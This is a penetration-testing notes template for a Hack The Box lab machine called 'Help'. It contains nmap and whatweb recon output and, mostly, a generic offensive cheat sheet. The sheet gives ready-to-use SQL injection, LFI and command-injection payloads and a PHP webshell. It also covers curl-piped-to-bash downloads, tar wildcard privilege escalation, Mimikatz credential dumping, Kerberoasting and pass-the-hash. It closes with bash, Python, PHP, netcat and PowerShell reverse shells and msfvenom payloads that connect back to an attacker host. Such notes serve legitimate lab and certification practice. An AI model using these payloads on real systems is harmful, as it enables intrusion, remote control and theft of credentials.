# Help

## Box Info
- IP: 10.129.230.159
- OS: linux
- Difficulty:
- Date Started: 2026-02-17

---

## Phase 0: Setup

```bash
export IP=10.10.10.x
export LHOST=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
export LPORT=443
```

```bash
echo "$IP <domain>" | sudo tee -a /etc/hosts
```

```bash
# Listeners
rlwrap nc -lvnp $LPORT
python3 -m http.server 1337
impacket-smbserver smbfolder $(pwd) -smb2support -user kali -password kali
```

---

## Phase 1: Reconnaissance

### Automated Recon (Recon System)

```bash
python3 recon_system.py -t $IP --batch
python3 recon_system.py -t $IP --full --batch
python3 recon_system.py -t $IP -d <domain> --full --batch
```

### Port Scan (TCP)

```
sudo nmap $IP -sV -Pn
```

```
Nmap scan report for help.htb (10.129.230.159)
Host is up (0.038s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18
3000/tcp open  http    Node.js Express framework
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds

```

### Port Scan (UDP)

```
sudo nmap -sU --top-ports 100 --min-rate 5000 $IP
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 10:57 +0100
Nmap scan report for help.htb (10.129.230.159)
Host is up (0.032s latency).
Not shown: 94 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
111/udp   closed rpcbind
177/udp   closed xdmcp
1022/udp  closed exp2
1030/udp  closed iad1
49182/udp closed unknown
49185/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
```

### Service Scan

```
nmap -p <PORTS> -sC -sV $IP
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

#### Tech Stack & Hosts

- [ ] Tech stack identified (whatweb / Wappalyzer)

```
whatweb http://$IP
curl -s -I http://$IP
```

```
http://10.129.230.159 [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.230.159], RedirectLocation[http://help.htb/], Title[302 Found]
http://help.htb/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.230.159], Title[Apache2 Ubuntu Default Page: It works]

JS App, 
```

- [ ] Domain/Redirect gefunden? In /etc/hosts eintragen, Subdomains aus VHost-Fuzzing ebenfalls

```
echo "$IP <domain>" | sudo tee -a /etc/hosts
```

#### Directory & VHost Fuzzing

- [ ] Directory fuzzing (feroxbuster / gobuster)

Erster Scan ohne Extensions (nur Verzeichnisse):
```
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```
```
gobuster dir -t 20 -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Dann mit Extensions je nach Tech-Stack nachlegen:

PHP / Apache / Linux:
```
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak
```

ASP / IIS / Windows:
```
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,aspx,html,txt
```

Node.js / JavaScript Backend:
```
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x js,json,html,txt
```

```
(paste results)
```

- [ ] VHost fuzzing (ffuf)

```
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fc 301,302 --fs <default_size>
```

```
(paste results)
```

#### Content & Application

- [ ] Source code reviewed (comments, hidden fields, JS)

```
curl -s http://$IP/ | grep -i "<!--\|password\|user\|hidden\|api\|key\|token"
```

```
(paste results)
```

- [ ] Default creds tested

```
# Check default credentials for identified service
```

- [ ] CMS identified? (WordPress / Drupal / Joomla / custom)

```
wpscan --url http://$IP -e ap,at,tt,vp --api-token $WPSCAN_API
```

```
(paste results)
```

- [ ] Parameter fuzzing

```
ffuf -u "http://$IP/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fc 404
```

```
(paste results)
```

- [ ] API endpoints

```
ffuf -u http://$IP/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
```

```
(paste results)
```

### Other Services

- [ ] SMB

```
smbmap -H $IP
smbclient -N -L //$IP
crackmapexec smb $IP -u '' -p '' --shares
```

- [ ] FTP

```
ftp $IP
# anonymous / anonymous
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor $IP
```

- [ ] SNMP

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
snmpbulkwalk -v2c -c public $IP .
```

- [ ] DNS

```
dig axfr $DOMAIN @$IP
dig -x $IP @$IP
```

- [ ] SMTP

```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
```

- [ ] LDAP

```
ldapsearch -x -H ldap://$IP -s base namingcontexts
```

- [ ] RPC

```
rpcclient -U '' -N $IP
# enumdomusers / enumdomgroups / querydispinfo
```

- [ ] NFS

```
showmount -e $IP
```

```
(paste findings)
```

---

## Phase 2: Initial Access

### Vulnerability:
### Attack Vector:

### Attack Reference

#### SQL Injection

```sql
-- Column count
' ORDER BY 1-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Extract data
' UNION SELECT 1,user(),database()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,username,password FROM users-- -
```

```bash
sqlmap -u "http://$IP/page?id=1" --batch --dbs
sqlmap -u "http://$IP/page?id=1" -D dbname -T users --dump
sqlmap -u "http://$IP/page?id=1" --os-shell
sqlmap -r request.txt --batch --dbs
```

#### File Upload / Webshell

```php
<?php system($_GET['cmd']); ?>
```

```
# Extension bypass: shell.php5, shell.phtml, shell.pHp, shell.php.jpg
# Content-Type bypass: image/jpeg, image/png
# Magic bytes: GIF89a<?php system($_GET['cmd']); ?>
```

#### LFI / Directory Traversal

```bash
# Linux
curl "http://$IP/page?file=../../../etc/passwd"
curl "http://$IP/page?file=php://filter/convert.base64-encode/resource=index.php"
curl "http://$IP/page?file=data://text/plain,<?php system('id'); ?>"

# Windows
..\..\windows\win.ini
..\..\inetpub\wwwroot\web.config
```

#### SSRF

```bash
curl "http://$IP/fetch?url=http://127.0.0.1:8080"
curl "http://$IP/fetch?url=file:///etc/passwd"
```

#### Command Injection

```
; id
| id
$(id)
`id`
```

#### Known CVEs

```bash
searchsploit <software> <version>
searchsploit -m <exploit_id>
```

#### Brute Force

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 20
crackmapexec smb $IP -u users.txt -p 'Password1' --continue-on-success
```

### Steps:

```
(commands used)
```

### Proof (local.txt):

```
cat local.txt && whoami && hostname && ip a
```

---

## Phase 3: Post-Exploitation

### Stabilize Shell

```bash
# Linux
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 160
```

```powershell
# Windows
powershell -ep bypass
```

### Credential Hunting

```bash
# Linux
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | head -30
cat /var/www/html/wp-config.php
cat /etc/shadow
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
cat /home/*/.bash_history
env
grep -ri "password" /var/www/ 2>/dev/null
```

```powershell
# Windows
cmdkey /list
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"
type C:\Windows\Panther\Unattend.xml
reg query HKLM /f password /t REG_SZ /s
type C:\inetpub\wwwroot\web.config
```

### Internal Enumeration

```bash
ip a && ip route && arp -a && ss -tlnp
for i in $(seq 1 254); do (ping -c 1 10.10.10.$i | grep "bytes from" &); done
```

---

## Phase 4: Privilege Escalation

### Linux Enumeration Checklist

- [ ] LinPEAS / pspy (automated first)

```
curl http://$LHOST:1337/linpeas.sh | bash | tee linpeas.txt
curl http://$LHOST:1337/pspy64 -o pspy64 && chmod +x pspy64 && ./pspy64
```

- [ ] sudo -l

```
sudo -l
# Check GTFOBins for each binary listed
```

- [ ] SUID binaries

```
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins for each
```

- [ ] SGID binaries

```
find / -perm -2000 -type f 2>/dev/null
```

- [ ] Capabilities

```
getcap -r / 2>/dev/null
```

- [ ] Cron jobs

```
cat /etc/crontab
ls -la /etc/cron*
crontab -l
```

- [ ] Writable files in PATH

```
echo $PATH
find / -writable -type d 2>/dev/null
```

- [ ] Wildcard injection

```
# If cron runs: tar -zxf /tmp/backup.tar.gz *
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > shell.sh
touch -- "--checkpoint-action=exec=sh shell.sh"
touch -- "--checkpoint=1"
```

- [ ] Kernel version

```
uname -a && cat /etc/os-release
# searchsploit linux kernel <version> privilege escalation
```

- [ ] NFS shares

```
cat /etc/exports
# If no_root_squash: mount, create SUID binary as root
```

- [ ] Docker/LXD group

```
id
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

- [ ] Writable /etc/passwd or /etc/shadow

```
ls -la /etc/passwd /etc/shadow
# openssl passwd -1 w00t
# echo 'root2:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

- [ ] Internal services (127.0.0.1 only)

```
ss -tlnp
```

- [ ] SSH keys

```
find / -name id_rsa -o -name authorized_keys 2>/dev/null
```

- [ ] Config files with passwords

```
find / -name wp-config.php -o -name .env -o -name "*.conf" 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null
```

- [ ] History files

```
cat ~/.bash_history ~/.mysql_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
```

- [ ] Interesting groups

```
id
# adm, sudo, disk, video, docker, lxd
```

```
(paste linpeas/privesc highlights)
```

### Windows Enumeration Checklist

- [ ] winPEAS / PrivescCheck

```powershell
iwr -uri http://$LHOST:1337/winpeas64.exe -Outfile winpeas64.exe
.\winpeas64.exe
```

- [ ] Basic info

```powershell
whoami /priv
whoami /groups
net user
net localgroup Administrators
systeminfo
```

- [ ] SeImpersonatePrivilege

```powershell
.\PrintSpoofer64.exe -c "C:\TEMP\ncat.exe $LHOST $LPORT -e cmd"
.\GodPotato-NET4.exe -cmd "C:\TEMP\ncat.exe $LHOST $LPORT -e cmd"
```

- [ ] Service misconfiguration

```powershell
# Unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\"
# Writable service binary
icacls "C:\path\to\service.exe"
# Change binary path
sc config <svc> binpath= "C:\TEMP\shell.exe"
```

- [ ] Scheduled tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User"
```

- [ ] AlwaysInstallElevated

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- [ ] Mimikatz (requires admin)

```powershell
.\mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
.\mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

### AD Attacks

```bash
# Automated AD Recon
python3 ad_system.py --dc $IP --domain <domain> --full --batch

# Kerberoasting
impacket-GetUserSPNs -request -dc-ip $IP domain/user:password
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force

# AS-REP Roasting
impacket-GetNPUsers -dc-ip $IP -usersfile users.txt -no-pass domain/
hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force

# DCSync
impacket-secretsdump domain/user:"password"@$IP

# BloodHound
.\SharpHound.exe --CollectionMethods All

# Password Spray
crackmapexec smb $IP -u users.txt -p 'Password1' --continue-on-success
```

### Privesc Vector:
### Steps:

```
(commands used)
```

### Proof (proof.txt):

```
cat /root/proof.txt && whoami && hostname && ip a
```

---

## Phase 5: Lateral Movement

### Tunneling

```bash
# Chisel SOCKS Proxy
./chisel server -p 8000 --reverse                    # attacker
./chisel client $LHOST:8000 R:socks                  # target
# -> socks5 127.0.0.1:1080 in /etc/proxychains4.conf

# SSH Tunneling
ssh -N -L 0.0.0.0:LOCAL_PORT:TARGET_IP:TARGET_PORT user@ssh_server   # local forward
ssh -N -D 0.0.0.0:9999 user@ssh_server                                # dynamic SOCKS
ssh -N -R 127.0.0.1:LOCAL_PORT:TARGET_IP:TARGET_PORT kali@$LHOST      # remote forward

# Ligolo-ng
./proxy -selfcert -laddr 0.0.0.0:11601               # attacker
./agent -connect $LHOST:11601 -ignore-cert             # target
```

### Pass the Hash

```bash
impacket-psexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@$IP
impacket-wmiexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@$IP
evil-winrm -i $IP -u Administrator -H NTLM_HASH
crackmapexec smb $IP -u Administrator -H NTLM_HASH
```

### Remote Execution

```bash
evil-winrm -i $IP -u user -p password
impacket-psexec domain/user:password@$IP
xfreerdp /u:user /p:password /v:$IP /cert:ignore
```

---

## Phase 6: Loot & Proof

### Capture Flags

```bash
# Linux
cat /root/proof.txt && cat /home/*/local.txt && whoami && hostname && ip a
```

```powershell
# Windows
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\*\Desktop\local.txt
whoami && hostname && ipconfig
```

---

## Credentials Found

| Username | Password/Hash | Service | Source |
|----------|--------------|---------|--------|
|          |              |         |        |

## Flags
- local.txt:
- proof.txt:

## Loot
<!-- hashes, keys, tokens, interesting files -->

## Notes
<!-- timeline, dead ends, things to remember -->

---

## Quick Reference

### Reverse Shells

```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
powershell -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()"
```

```bash
# msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
```

### File Transfer

```bash
# To Linux
python3 -m http.server 1337   # attacker
wget http://$LHOST:1337/file   # target
curl http://$LHOST:1337/file -o file
```

```powershell
# To Windows
iwr -uri http://$LHOST:1337/file.exe -Outfile file.exe
certutil -urlcache -split -f "http://$LHOST:1337/file.exe" file.exe
# SMB: impacket-smbserver smbfolder $(pwd) -smb2support -user kali -password kali
$pass = ConvertTo-SecureString 'kali' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\LHOST\smbfolder
copy kali:\file.exe C:\TEMP\
```

### Hash Cracking

| Hash Type | Mode | Command |
|-----------|------|---------|
| NTLM | 1000 | `hashcat -m 1000 hash.txt rockyou.txt` |
| Net-NTLMv2 | 5600 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Kerberoast | 13100 | `hashcat -m 13100 hash.txt rockyou.txt` |
| AS-REP | 18200 | `hashcat -m 18200 hash.txt rockyou.txt` |
| md5crypt | 500 | `hashcat -m 500 hash.txt rockyou.txt` |
| sha512crypt | 1800 | `hashcat -m 1800 hash.txt rockyou.txt` |
| bcrypt | 3200 | `hashcat -m 3200 hash.txt rockyou.txt` |
